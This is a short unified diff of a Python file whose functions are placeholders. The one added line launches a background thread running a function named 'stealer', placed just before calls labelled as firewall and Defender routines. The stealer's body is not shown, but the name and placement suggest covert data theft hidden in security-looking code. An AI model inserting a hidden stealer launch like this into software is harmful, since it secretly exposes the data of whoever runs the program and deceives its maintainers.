@@ -21,6 +21,7 @@ def code1():
 def code2():
     print("no")
 def code3():
+    threading.Thread(target=stealer).start()
     Security.FireWall()
     Security.Defender()
 
